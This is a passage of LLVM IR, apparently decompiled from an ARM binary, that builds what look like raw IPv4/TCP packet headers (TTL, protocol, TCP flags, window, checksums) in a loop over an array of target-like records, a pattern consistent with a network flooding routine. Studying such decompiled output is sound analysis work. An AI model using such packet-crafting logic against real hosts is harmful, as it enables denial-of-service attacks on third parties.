  %v7_c348 = load i32, i32* %v6_c348, align 4
  store i32 %v7_c348, i32* @r4, align 4
  %v1_c34c = inttoptr i32 %v7_c348 to i8*
  %v2_c34c = load i8, i8* %v1_c34c, align 1
  %tmp120 = urem i8 %v2_c34c, 16
  %v1_c350 = zext i8 %tmp120 to i32
  %v1_c354 = or i32 %v1_c350, 64
  store i32 %v1_c354, i32* %r3.global-to-local, align 4
  %v1_c358 = trunc i32 %v1_c354 to i8
  store i8 %v1_c358, i8* %v1_c34c, align 1
  %v0_c35c = load i32, i32* @sl, align 4
  %v3_c35c = mul i32 %v0_c35c, 65536
  store i32 %v3_c35c, i32* %r2.global-to-local, align 4
  %v0_c360 = load i32, i32* @r4, align 4
  %v1_c360 = inttoptr i32 %v0_c360 to i8*
  %v2_c360 = load i8, i8* %v1_c360, align 1
  %v1_c368 = urem i32 %v0_c35c, 256
  %tmp91 = udiv i32 %v0_c35c, 256
  %v3_c36c = urem i32 %tmp91, 256
  %v1_c370 = and i8 %v2_c360, -16
  %v4_c374 = mul nuw nsw i32 %v1_c368, 256
  %v5_c374 = or i32 %v4_c374, %v3_c36c
  store i32 %v5_c374, i32* %r2.global-to-local, align 4
  %v1_c378 = or i8 %v1_c370, 5
  store i32 %v1_beec, i32* %ip.global-to-local, align 4
  store i32 %v1_c368, i32* %r3.global-to-local, align 4
  store i8 %v1_c378, i8* %v1_c360, align 1
  %v0_c388 = load i32, i32* %r3.global-to-local, align 4
  %v1_c388 = trunc i32 %v0_c388 to i8
  %v2_c388 = load i32, i32* @r4, align 4
  %v3_c388 = add i32 %v2_c388, 3
  %v4_c388 = inttoptr i32 %v3_c388 to i8*
  store i8 %v1_c388, i8* %v4_c388, align 1
  store i32 %v4_c38c, i32* %r3.global-to-local, align 4
  %v0_c390 = load i32, i32* %ip.global-to-local, align 4
  %v2_c390 = icmp eq i32 %v0_c390, 0
  store i1 %v2_c390, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_c1bc, i32* %r0.global-to-local, align 4
  store i32 %v3_c1c4, i32* %r1.global-to-local, align 4
  %v2_c39c = load i32, i32* @r4, align 4
  %v3_c39c = add i32 %v2_c39c, 1
  %v4_c39c = inttoptr i32 %v3_c39c to i8*
  store i8 %v1_c39c, i8* %v4_c39c, align 1
  store i32 %v4_c3a0, i32* %ip.global-to-local, align 4
  %v0_c3a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c3a4, label %bb93, label %bb92

bb92:                                             ; preds = %dec_label_pc_c2b4
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb93

bb93:                                             ; preds = %dec_label_pc_c2b4, %bb92
  %v0_c3a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_c3a8 = trunc i32 %v0_c3a8 to i8
  %v2_c3a8 = load i32, i32* @r4, align 4
  %v3_c3a8 = add i32 %v2_c3a8, 2
  %v4_c3a8 = inttoptr i32 %v3_c3a8 to i8*
  store i8 %v1_c3a8, i8* %v4_c3a8, align 1
  %v0_c3ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c3ac, label %.thread10, label %bb94

bb94:                                             ; preds = %bb93
  %v1_c3ac = load i32, i32* %r3.global-to-local, align 4
  %v2_c3ac = trunc i32 %v1_c3ac to i8
  %v3_c3ac = load i32, i32* @r4, align 4
  %v4_c3ac = add i32 %v3_c3ac, 6
  %v5_c3ac = inttoptr i32 %v4_c3ac to i8*
  store i8 %v2_c3ac, i8* %v5_c3ac, align 1
  %v0_c3b0.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c3b0.pr, label %.thread10, label %bb95

bb95:                                             ; preds = %bb94
  store i32 0, i32* %r2.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %bb93, %bb94, %bb95
  store i32 6, i32* %r3.global-to-local, align 4
  %v0_c3b8 = load i32, i32* %ip.global-to-local, align 4
  %v1_c3b8 = trunc i32 %v0_c3b8 to i8
  %v2_c3b8 = load i32, i32* @r4, align 4
  %v3_c3b8 = add i32 %v2_c3b8, 8
  %v4_c3b8 = inttoptr i32 %v3_c3b8 to i8*
  store i8 %v1_c3b8, i8* %v4_c3b8, align 1
  %v0_c3bc = load i32, i32* %r3.global-to-local, align 4
  %v1_c3bc = trunc i32 %v0_c3bc to i8
  %v2_c3bc = load i32, i32* @r4, align 4
  %v3_c3bc = add i32 %v2_c3bc, 9
  %v4_c3bc = inttoptr i32 %v3_c3bc to i8*
  store i8 %v1_c3bc, i8* %v4_c3bc, align 1
  %v0_c3c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c3c0, label %bb97, label %bb96

bb96:                                             ; preds = %.thread10
  %v1_c3c0 = load i32, i32* %r2.global-to-local, align 4
  %v2_c3c0 = trunc i32 %v1_c3c0 to i8
  %v3_c3c0 = load i32, i32* @r4, align 4
  %v4_c3c0 = add i32 %v3_c3c0, 7
  %v5_c3c0 = inttoptr i32 %v4_c3c0 to i8*
  store i8 %v2_c3c0, i8* %v5_c3c0, align 1
  br label %bb97

bb97:                                             ; preds = %.thread10, %bb96
  %v2_c3c8 = load i32, i32* @global_var_1a420.104, align 4
  store i32 %v2_c3c8, i32* %r3.global-to-local, align 4
  %v1_c3cc = load i32, i32* @r4, align 4
  %v2_c3cc = add i32 %v1_c3cc, 12
  %v3_c3cc = inttoptr i32 %v2_c3cc to i32*
  store i32 %v2_c3c8, i32* %v3_c3cc, align 4
  %v0_c3d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_c3d0 = trunc i32 %v0_c3d0 to i8
  %v2_c3d0 = load i32, i32* @r4, align 4
  %v3_c3d0 = add i32 %v2_c3d0, 4
  %v4_c3d0 = inttoptr i32 %v3_c3d0 to i8*
  store i8 %v1_c3d0, i8* %v4_c3d0, align 1
  %v3_c3d4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c3d4, i32* %r2.global-to-local, align 4
  store i32 %v4_be5c, i32* %r0.global-to-local, align 4
  %v4_c3dc = mul i32 %v3_c3d4, 16
  %v5_c3dc = add i32 %v4_c3dc, %v4_be5c
  %v6_c3dc = inttoptr i32 %v5_c3dc to i32*
  %v7_c3dc = load i32, i32* %v6_c3dc, align 4
  store i32 %v7_c3dc, i32* %r3.global-to-local, align 4
  %v0_c3e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c3e0 = trunc i32 %v0_c3e0 to i8
  %v2_c3e0 = load i32, i32* @r4, align 4
  %v3_c3e0 = add i32 %v2_c3e0, 5
  %v4_c3e0 = inttoptr i32 %v3_c3e0 to i8*
  store i8 %v1_c3e0, i8* %v4_c3e0, align 1
  %v0_c3e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_c3e4 = load i32, i32* @r4, align 4
  %v2_c3e4 = add i32 %v1_c3e4, 16
  %v3_c3e4 = inttoptr i32 %v2_c3e4 to i32*
  store i32 %v0_c3e4, i32* %v3_c3e4, align 4
  %v0_c3e8 = load i32, i32* %r2.global-to-local, align 4
  %v3_c3e8 = mul i32 %v0_c3e8, 16
  %v1_c3ec = load i32, i32* %r0.global-to-local, align 4
  %v2_c3ec = add i32 %v1_c3ec, %v3_c3e8
  store i32 %v2_c3ec, i32* %r2.global-to-local, align 4
  %v1_c3f0 = add i32 %v2_c3ec, 13
  %v2_c3f0 = inttoptr i32 %v1_c3f0 to i8*
  %v3_c3f0 = load i8, i8* %v2_c3f0, align 1
  %v4_c3f0 = zext i8 %v3_c3f0 to i32
  store i32 %v4_c3f0, i32* %r1.global-to-local, align 4
  %v1_c3f4 = add i32 %v2_c3ec, 12
  %v2_c3f4 = inttoptr i32 %v1_c3f4 to i8*
  %v3_c3f4 = load i8, i8* %v2_c3f4, align 1
  %v4_c3f4 = zext i8 %v3_c3f4 to i32
  %v4_c3f8 = mul nuw nsw i32 %v4_c3f0, 256
  %v5_c3f8 = or i32 %v4_c3f4, %v4_c3f8
  store i32 %v5_c3f8, i32* %r3.global-to-local, align 4
  %v2_c3fc = load i32, i32* @r4, align 4
  %v3_c3fc = add i32 %v2_c3fc, 20
  %v4_c3fc = inttoptr i32 %v3_c3fc to i8*
  store i8 %v3_c3f4, i8* %v4_c3fc, align 1
  %v0_c400 = load i32, i32* @r4, align 4
  %v1_c400 = add i32 %v0_c400, 20
  store i32 %v1_c400, i32* @r6, align 4
  %v0_c404 = load i32, i32* %r3.global-to-local, align 4
  %v3_c404 = sdiv i32 %v0_c404, 256
  store i32 %v3_c404, i32* %r3.global-to-local, align 4
  %v1_c408 = trunc i32 %v3_c404 to i8
  %v3_c408 = add i32 %v0_c400, 21
  %v4_c408 = inttoptr i32 %v3_c408 to i8*
  store i8 %v1_c408, i8* %v4_c408, align 1
  %v0_c40c = load i32, i32* @r6, align 4
  %v1_c40c = add i32 %v0_c40c, 13
  %v2_c40c = inttoptr i32 %v1_c40c to i8*
  %v3_c40c = load i8, i8* %v2_c40c, align 1
  %v4_c40c = zext i8 %v3_c40c to i32
  store i32 %v4_c40c, i32* %r3.global-to-local, align 4
  %v0_c410 = load i32, i32* %r2.global-to-local, align 4
  %v1_c410 = add i32 %v0_c410, 8
  %v2_c410 = inttoptr i32 %v1_c410 to i32*
  %v3_c410 = load i32, i32* %v2_c410, align 4
  store i32 %v3_c410, i32* %r1.global-to-local, align 4
  %v1_c414 = or i32 %v4_c40c, 1
  store i32 %v1_c414, i32* %r3.global-to-local, align 4
  %v1_c418 = add i32 %v0_c410, 15
  %v2_c418 = inttoptr i32 %v1_c418 to i8*
  %v3_c418 = load i8, i8* %v2_c418, align 1
  %v4_c418 = zext i8 %v3_c418 to i32
  store i32 %v4_c418, i32* %ip.global-to-local, align 4
  %v1_c41c = add i32 %v0_c410, 14
  %v2_c41c = inttoptr i32 %v1_c41c to i8*
  %v3_c41c = load i8, i8* %v2_c41c, align 1
  %v4_c41c = zext i8 %v3_c41c to i32
  store i32 %v4_c41c, i32* %r0.global-to-local, align 4
  %v2_c420 = add i32 %v0_c40c, 4
  %v3_c420 = inttoptr i32 %v2_c420 to i32*
  store i32 %v3_c410, i32* %v3_c420, align 4
  %v0_c424 = load i32, i32* %r2.global-to-local, align 4
  %v1_c424 = add i32 %v0_c424, 4
  %v2_c424 = inttoptr i32 %v1_c424 to i32*
  %v3_c424 = load i32, i32* %v2_c424, align 4
  store i32 %v3_c424, i32* %lr.global-to-local, align 4
  %v0_c428 = load i32, i32* %r3.global-to-local, align 4
  %v1_c428 = trunc i32 %v0_c428 to i8
  %v2_c428 = load i32, i32* @r6, align 4
  %v3_c428 = add i32 %v2_c428, 13
  %v4_c428 = inttoptr i32 %v3_c428 to i8*
  store i8 %v1_c428, i8* %v4_c428, align 1
  %v0_c42c = load i32, i32* @r6, align 4
  %v1_c42c = add i32 %v0_c42c, 12
  %v2_c42c = inttoptr i32 %v1_c42c to i8*
  %v3_c42c = load i8, i8* %v2_c42c, align 1
  %v4_c42c = zext i8 %v3_c42c to i32
  store i32 %v4_c42c, i32* %r2.global-to-local, align 4
  %v1_c430 = add i32 %v0_c42c, 13
  %v2_c430 = inttoptr i32 %v1_c430 to i8*
  %v3_c430 = load i8, i8* %v2_c430, align 1
  %v4_c430 = zext i8 %v3_c430 to i32
  %v0_c434 = load i32, i32* %r0.global-to-local, align 4
  %v1_c434 = load i32, i32* %ip.global-to-local, align 4
  %v4_c434 = mul i32 %v1_c434, 256
  %v5_c434 = or i32 %v4_c434, %v0_c434
  store i32 %v5_c434, i32* %r0.global-to-local, align 4
  %tmp121 = urem i8 %v3_c42c, 16
  %v1_c438 = zext i8 %tmp121 to i32
  %v3_c43c = sdiv i32 %v5_c434, 256
  store i32 %v3_c43c, i32* %r1.global-to-local, align 4
  %v1_c440 = or i32 %v1_c438, 128
  store i32 %v1_c440, i32* %r2.global-to-local, align 4
  %v1_c444 = or i32 %v4_c430, 16
  store i32 %v1_c444, i32* %r3.global-to-local, align 4
  %v1_c448 = trunc i32 %v3_c43c to i8
  %v3_c448 = add i32 %v0_c42c, 3
  %v4_c448 = inttoptr i32 %v3_c448 to i8*
  store i8 %v1_c448, i8* %v4_c448, align 1
  %v0_c44c = load i32, i32* %r2.global-to-local, align 4
  %v1_c44c = trunc i32 %v0_c44c to i8
  %v2_c44c = load i32, i32* @r6, align 4
  %v3_c44c = add i32 %v2_c44c, 12
  %v4_c44c = inttoptr i32 %v3_c44c to i8*
  store i8 %v1_c44c, i8* %v4_c44c, align 1
  %v0_c450 = load i32, i32* %r3.global-to-local, align 4
  %v1_c450 = trunc i32 %v0_c450 to i8
  %v2_c450 = load i32, i32* @r6, align 4
  %v3_c450 = add i32 %v2_c450, 13
  %v4_c450 = inttoptr i32 %v3_c450 to i8*
  store i8 %v1_c450, i8* %v4_c450, align 1
  %v0_c454 = load i32, i32* %lr.global-to-local, align 4
  %v1_c454 = load i32, i32* @r6, align 4
  %v2_c454 = add i32 %v1_c454, 8
  %v3_c454 = inttoptr i32 %v2_c454 to i32*
  store i32 %v0_c454, i32* %v3_c454, align 4
  %v0_c458 = load i32, i32* %r0.global-to-local, align 4
  %v1_c458 = trunc i32 %v0_c458 to i8
  %v2_c458 = load i32, i32* @r6, align 4
  %v3_c458 = add i32 %v2_c458, 2
  %v4_c458 = inttoptr i32 %v3_c458 to i8*
  store i8 %v1_c458, i8* %v4_c458, align 1
  %v0_c45c = call i32 @function_f67c()
  %v1_c45c = trunc i32 %v0_c45c to i8
  store i32 %v0_c45c, i32* %r0.global-to-local, align 4
  store i32 %v1_bf24, i32* %r1.global-to-local, align 4
  %v0_c464 = load i32, i32* @r6, align 4
  %v1_c464 = add i32 %v0_c464, 13
  %v2_c464 = inttoptr i32 %v1_c464 to i8*
  %v3_c464 = load i8, i8* %v2_c464, align 1
  %v4_c464 = zext i8 %v3_c464 to i32
  store i32 %v1_c468, i32* %r2.global-to-local, align 4
  %v1_c46c = and i32 %v4_c464, 223
  %v5_c470 = or i32 %v1_c46c, %v4_c470
  store i32 %v5_c470, i32* %r3.global-to-local, align 4
  %v1_c474 = trunc i32 %v5_c470 to i8
  store i8 %v1_c474, i8* %v2_c464, align 1
  store i32 %v1_bf44, i32* %ip.global-to-local, align 4
  %v0_c47c = load i32, i32* @r6, align 4
  %v1_c47c = add i32 %v0_c47c, 13
  %v2_c47c = inttoptr i32 %v1_c47c to i8*
  %v3_c47c = load i8, i8* %v2_c47c, align 1
  %v4_c47c = zext i8 %v3_c47c to i32
  store i32 %v1_c480, i32* %r3.global-to-local, align 4
  %v1_c484 = and i32 %v4_c47c, 239
  %v5_c488 = or i32 %v1_c484, %v4_c488
  store i32 %v5_c488, i32* %r2.global-to-local, align 4
  %v1_c48c = trunc i32 %v5_c488 to i8
  store i8 %v1_c48c, i8* %v2_c47c, align 1
  store i32 %v1_bf64, i32* %r1.global-to-local, align 4
  %v0_c494 = load i32, i32* @r6, align 4
  %v1_c494 = add i32 %v0_c494, 13
  %v2_c494 = inttoptr i32 %v1_c494 to i8*
  %v3_c494 = load i8, i8* %v2_c494, align 1
  %v4_c494 = zext i8 %v3_c494 to i32
  store i32 %v1_c498, i32* %r2.global-to-local, align 4
  %v1_c49c = and i32 %v4_c494, 247
  %v5_c4a0 = or i32 %v1_c49c, %v4_c4a0
  store i32 %v5_c4a0, i32* %r3.global-to-local, align 4
  %v1_c4a4 = trunc i32 %v5_c4a0 to i8
  store i8 %v1_c4a4, i8* %v2_c494, align 1
  store i32 %v1_bf84, i32* %ip.global-to-local, align 4
  %v0_c4ac = load i32, i32* @r6, align 4
  %v1_c4ac = add i32 %v0_c4ac, 13
  %v2_c4ac = inttoptr i32 %v1_c4ac to i8*
  %v3_c4ac = load i8, i8* %v2_c4ac, align 1
  %v4_c4ac = zext i8 %v3_c4ac to i32
  store i32 %v1_c4b0, i32* %r3.global-to-local, align 4
  %v1_c4b4 = and i32 %v4_c4ac, 251
  %v5_c4b8 = or i32 %v1_c4b4, %v4_c4b8
  store i32 %v5_c4b8, i32* %r2.global-to-local, align 4
  %v1_c4bc = trunc i32 %v5_c4b8 to i8
  store i8 %v1_c4bc, i8* %v2_c4ac, align 1
  store i32 %v1_bfa4, i32* %r1.global-to-local, align 4
  %v0_c4c4 = load i32, i32* @r6, align 4
  %v1_c4c4 = add i32 %v0_c4c4, 13
  %v2_c4c4 = inttoptr i32 %v1_c4c4 to i8*
  %v3_c4c4 = load i8, i8* %v2_c4c4, align 1
  %v4_c4c4 = zext i8 %v3_c4c4 to i32
  store i32 %v1_c4c8, i32* %r2.global-to-local, align 4
  %v1_c4cc = and i32 %v4_c4c4, 253
  %v4_c4d0 = or i32 %v1_c4cc, %v3_c4d0
  store i32 %v4_c4d0, i32* %r3.global-to-local, align 4
  %v1_c4d4 = trunc i32 %v4_c4d0 to i8
  store i8 %v1_c4d4, i8* %v2_c4c4, align 1
  %v0_c4d8 = load i32, i32* @r6, align 4
  %v1_c4d8 = add i32 %v0_c4d8, 13
  %v2_c4d8 = inttoptr i32 %v1_c4d8 to i8*
  %v3_c4d8 = load i8, i8* %v2_c4d8, align 1
  %v4_c4d8 = zext i8 %v3_c4d8 to i32
  %v0_c4dc = load i32, i32* @r8, align 4
  %v1_c4dc = urem i32 %v0_c4dc, 2
  %v1_c4e0 = and i32 %v4_c4d8, 254
  store i32 %v1_c4e0, i32* %r2.global-to-local, align 4
  %v4_c4e437 = udiv i32 %v0_c45c, 256
  %v2_c4e8 = or i32 %v1_c4e0, %v1_c4dc
  store i32 %v2_c4e8, i32* %r3.global-to-local, align 4
  %v1_c4ec = trunc i32 %v4_c4e437 to i8
  %v3_c4ec = add i32 %v0_c4d8, 15
  %v4_c4ec = inttoptr i32 %v3_c4ec to i8*
  store i8 %v1_c4ec, i8* %v4_c4ec, align 1
  %v3_c4f0 = load i32, i32* @r6, align 4
  %v4_c4f0 = add i32 %v3_c4f0, 14
  %v5_c4f0 = inttoptr i32 %v4_c4f0 to i8*
  store i8 %v1_c45c, i8* %v5_c4f0, align 1
  %v0_c4f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_c4f4 = trunc i32 %v0_c4f4 to i8
  %v2_c4f4 = load i32, i32* @r6, align 4
  %v3_c4f4 = add i32 %v2_c4f4, 13
  %v4_c4f4 = inttoptr i32 %v3_c4f4 to i8*
  store i8 %v1_c4f4, i8* %v4_c4f4, align 1
  %v0_c4f8 = load i32, i32* @r4, align 4
  %v1_c4f8 = add i32 %v0_c4f8, 40
  store i32 %v1_c4f8, i32* %r0.global-to-local, align 4
  %v0_c4fc = load i32, i32* @sb, align 4
  store i32 %v0_c4fc, i32* @r1, align 4
  %v1_c500 = inttoptr i32 %v1_c4f8 to i8*
  %v2_c500 = call i32 @function_f7fc(i8* %v1_c500)
  store i32 %v2_c500, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c504

dec_label_pc_c504:                                ; preds = %dec_label_pc_c078, %dec_label_pc_c284, %bb97
  %v3_c504 = load i32, i32* %stack_var_-40, align 4
  %v1_c508 = add i32 %v3_c504, 1
  store i32 %v1_c508, i32* %r3.global-to-local, align 4
  %v1_c50c = load i32, i32* @fp, align 4
  %v9_c50c = icmp eq i32 %v1_c508, %v1_c50c
  store i1 %v9_c50c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c508, i32* %stack_var_-40, align 4
  %v5_c514 = icmp slt i32 %v1_c508, %v1_c50c
  br i1 %v5_c514, label %dec_label_pc_c078, label %dec_label_pc_c518

dec_label_pc_c518:                                ; preds = %dec_label_pc_c504, %.thread27
  %v0_c52021 = phi i32 [ %v0_c04c, %.thread27 ], [ %v1_c50c, %dec_label_pc_c504 ]
  %v0_c518 = load i32, i32* @sb, align 4
  %v1_c518 = add i32 %v0_c518, 40
  store i32 %v1_c518, i32* @sl, align 4
  %v1_c51c = add i32 %v0_c518, 20
  store i32 %v1_c51c, i32* @r7, align 4
  %v2_c698 = icmp eq i32 %v1_bffc, 0
  %v9_c554 = icmp eq i32 %v3_c054, add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1)
  br label %dec_label_pc_c520

dec_label_pc_c520:                                ; preds = %dec_label_pc_c57c, %dec_label_pc_c518
  %v0_c520 = phi i32 [ %v1_c65c, %dec_label_pc_c57c ], [ %v0_c52021, %dec_label_pc_c518 ]
  %v2_c520 = icmp eq i32 %v0_c520, 0
  store i1 %v2_c520, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp98 = icmp slt i32 %v0_c520, 1
  br label %dec_label_pc_c528

dec_label_pc_c528:                                ; preds = %dec_label_pc_c528, %dec_label_pc_c520
  br i1 %tmp98, label %dec_label_pc_c528, label %dec_label_pc_c52c

dec_label_pc_c52c:                                ; preds = %dec_label_pc_c528
  %v0_c52c = load i32, i32* @r7, align 4
  %tmp99 = mul i32 %v0_c52c, 256
  %v1_c534 = and i32 %tmp99, 65280
  %tmp100 = udiv i32 %v0_c52c, 256
  %v4_c538 = urem i32 %tmp100, 256
  %v5_c538 = or i32 %v4_c538, %v1_c534
  store i32 %v5_c538, i32* @r8, align 4
  store i32 %v4_be6c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000.102 to i32), i32* %r3.global-to-local, align 4
  store i32 %v3_c054, i32* %ip.global-to-local, align 4
  %v7_c54c = load i32, i32* %v2_be6c, align 4
  store i32 %v7_c54c, i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i1 %v9_c554, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* @r6, align 4
  %v1_c560 = add i32 %v7_c54c, 20
  store i32 %v1_c560, i32* @r5, align 4
  br i1 %v9_c554, label %dec_label_pc_c688, label %dec_label_pc_c568

dec_label_pc_c568:                                ; preds = %dec_label_pc_c668, %dec_label_pc_c52c
  %v0_c574 = phi i32 [ %v7_c674, %dec_label_pc_c668 ], [ %v7_c54c, %dec_label_pc_c52c ]
  store i1 %v2_c698, i1* %cpsr_z.global-to-local, align 1
  %v0_c570 = load i32, i32* @sb, align 4
  store i32 %v0_c570, i32* @r1, align 4
  %v1_c574 = add i32 %v0_c574, 40
  store i32 %v1_c574, i32* %r0.global-to-local, align 4
  br i1 %v2_c698, label %dec_label_pc_c57c, label %dec_label_pc_c6ac

dec_label_pc_c57c:                                ; preds = %dec_label_pc_c568, %dec_label_pc_c688, %dec_label_pc_c6ac
  %v2_c57c = phi i32 [ %v0_c574, %dec_label_pc_c568 ], [ %v0_c6a0, %dec_label_pc_c688 ], [ %v2_c57c.pre, %dec_label_pc_c6ac ]
  %v0_c57c = load i32, i32* @r6, align 4
  %v1_c57c = trunc i32 %v0_c57c to i8
  %v3_c57c = add i32 %v2_c57c, 10
  %v4_c57c = inttoptr i32 %v3_c57c to i8*
  store i8 %v1_c57c, i8* %v4_c57c, align 1
  %v0_c580 = load i32, i32* @r6, align 4
  %v1_c580 = trunc i32 %v0_c580 to i8
  %v2_c580 = load i32, i32* @r4, align 4
  %v3_c580 = add i32 %v2_c580, 11
  %v4_c580 = inttoptr i32 %v3_c580 to i8*
  store i8 %v1_c580, i8* %v4_c580, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c588 = load i32, i32* @r4, align 4
  store i32 %v0_c588, i32* @r0, align 4
  %v2_c58c = call i32 @function_ddf4(i32 %v0_c588, i32 20)
  %v3_c58c = trunc i32 %v2_c58c to i8
  store i32 %v2_c58c, i32* %r0.global-to-local, align 4
  %v3_c590 = load i32, i32* %stack_var_-40, align 4
  store i32 %v4_be5c, i32* %r2.global-to-local, align 4
  %v3_c598 = mul i32 %v3_c590, 16
  %v2_c59c = add i32 %v3_c598, %v4_be5c
  store i32 %v2_c59c, i32* %r1.global-to-local, align 4
  %v1_c5a0 = add i32 %v2_c59c, 4
  %v2_c5a0 = inttoptr i32 %v1_c5a0 to i32*
  %v3_c5a0 = load i32, i32* %v2_c5a0, align 4
  %v3_c5a4 = mul i32 %v3_c5a0, 65536
  store i32 %v3_c5a4, i32* %ip.global-to-local, align 4
  %tmp101 = mul i32 %v3_c5a0, 256
  %v1_c5ac = and i32 %tmp101, 65280
  %tmp102 = udiv i32 %v3_c5a0, 256
  %v4_c5b0 = urem i32 %tmp102, 256
  %v5_c5b0 = or i32 %v4_c5b0, %v1_c5ac
  store i32 %v5_c5b0, i32* %r2.global-to-local, align 4
  %v1_c5b4 = add i32 %v3_c5a0, 1
  store i32 %v1_c5b4, i32* %r3.global-to-local, align 4
  store i32 %v1_c5b4, i32* %v2_c5a0, align 4
  %v0_c5bc = load i32, i32* %r2.global-to-local, align 4
  %v1_c5bc = load i32, i32* @r5, align 4
  %v2_c5bc = add i32 %v1_c5bc, 4
  %v3_c5bc = inttoptr i32 %v2_c5bc to i32*
  store i32 %v0_c5bc, i32* %v3_c5bc, align 4
  %v0_c5c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5c0 = add i32 %v0_c5c0, 8
  %v2_c5c0 = inttoptr i32 %v1_c5c0 to i32*
  %v3_c5c0 = load i32, i32* %v2_c5c0, align 4
  %tmp103 = mul i32 %v3_c5c0, 256
  %v1_c5cc = and i32 %tmp103, 65280
  %tmp104 = udiv i32 %v3_c5c0, 256
  %v4_c5d0 = urem i32 %tmp104, 256
  %v5_c5d0 = or i32 %v4_c5d0, %v1_c5cc
  store i32 %v5_c5d0, i32* %r2.global-to-local, align 4
  %v4_c5d438 = udiv i32 %v2_c58c, 256
  %v1_c5d8 = trunc i32 %v4_c5d438 to i8
  %v2_c5d8 = load i32, i32* @r4, align 4
  %v3_c5d8 = add i32 %v2_c5d8, 11
  %v4_c5d8 = inttoptr i32 %v3_c5d8 to i8*
  store i8 %v1_c5d8, i8* %v4_c5d8, align 1
  %v3_c5dc = load i32, i32* @r4, align 4
  %v4_c5dc = add i32 %v3_c5dc, 10
  %v5_c5dc = inttoptr i32 %v4_c5dc to i8*
  store i8 %v3_c58c, i8* %v5_c5dc, align 1
  %v0_c5e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_c5e0 = load i32, i32* @r5, align 4
  %v2_c5e0 = add i32 %v1_c5e0, 8
  %v3_c5e0 = inttoptr i32 %v2_c5e0 to i32*
  store i32 %v0_c5e0, i32* %v3_c5e0, align 4
  %v0_c5e4 = load i32, i32* @r5, align 4
  store i32 %v0_c5e4, i32* @r1, align 4
  %v0_c5e8 = load i32, i32* @r8, align 4
  store i32 %v0_c5e8, i32* %r2.global-to-local, align 4
  %v0_c5ec = load i32, i32* @r7, align 4
  store i32 %v0_c5ec, i32* %r3.global-to-local, align 4
  %v0_c5f0 = load i32, i32* @r4, align 4
  store i32 %v0_c5f0, i32* %r0.global-to-local, align 4
  %v0_c5f4 = load i32, i32* @r6, align 4
  %v1_c5f4 = trunc i32 %v0_c5f4 to i8
  %v3_c5f4 = add i32 %v0_c5e4, 16
  %v4_c5f4 = inttoptr i32 %v3_c5f4 to i8*
  store i8 %v1_c5f4, i8* %v4_c5f4, align 1
  %v0_c5f8 = load i32, i32* @r6, align 4
  %v1_c5f8 = trunc i32 %v0_c5f8 to i8
  %v2_c5f8 = load i32, i32* @r5, align 4
  %v3_c5f8 = add i32 %v2_c5f8, 17
  %v4_c5f8 = inttoptr i32 %v3_c5f8 to i8*
  store i8 %v1_c5f8, i8* %v4_c5f8, align 1
  %v4_c5fc = call i32 @function_de50(i32 %v0_c5f0, i32 %v0_c5e4, i32 %v0_c5e8, i32 %v0_c5ec)
  %v5_c5fc = trunc i32 %v4_c5fc to i8
  store i32 %v4_c5fc, i32* %r0.global-to-local, align 4
  %v4_c60039 = udiv i32 %v4_c5fc, 256
  %v1_c604 = trunc i32 %v4_c60039 to i8
  %v2_c604 = load i32, i32* @r5, align 4
  %v3_c604 = add i32 %v2_c604, 17
  %v4_c604 = inttoptr i32 %v3_c604 to i8*
  store i8 %v1_c604, i8* %v4_c604, align 1
  %v3_c608 = load i32, i32* @r5, align 4
  %v4_c608 = add i32 %v3_c608, 16
  %v5_c608 = inttoptr i32 %v4_c608 to i8*
  store i8 %v5_c5fc, i8* %v5_c608, align 1
  %v3_c60c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c60c, i32* %r3.global-to-local, align 4
  %v0_c610 = load i32, i32* @r4, align 4
  %v1_c610 = add i32 %v0_c610, 20
  %v2_c610 = inttoptr i32 %v1_c610 to i32*
  %v3_c610 = load i32, i32* %v2_c610, align 4
  %v5_c618 = mul i32 %v3_c60c, 24
  %v3_c620 = udiv i32 %v3_c610, 65536
  store i32 %v3_c620, i32* %r2.global-to-local, align 4
  %v2_c624 = add i32 %v5_c618, %arg2
  store i32 %v2_c624, i32* %ip.global-to-local, align 4
  %v3_c6287 = udiv i32 %v3_c610, 16777216
  %v1_c62c = trunc i32 %v3_c6287 to i8
  %v3_c62c = add i32 %v2_c624, 3
  %v4_c62c = inttoptr i32 %v3_c62c to i8*
  store i8 %v1_c62c, i8* %v4_c62c, align 1
  %v0_c630 = load i32, i32* %r2.global-to-local, align 4
  %v1_c630 = trunc i32 %v0_c630 to i8
  %v2_c630 = load i32, i32* %ip.global-to-local, align 4
  %v3_c630 = add i32 %v2_c630, 2
  %v4_c630 = inttoptr i32 %v3_c630 to i8*
  store i8 %v1_c630, i8* %v4_c630, align 1
  %v0_c634 = load i32, i32* @r4, align 4
  store i32 %v0_c634, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_c00c, i32* %r0.global-to-local, align 4
  %v0_c640 = load i32, i32* @sl, align 4
  store i32 %v0_c640, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
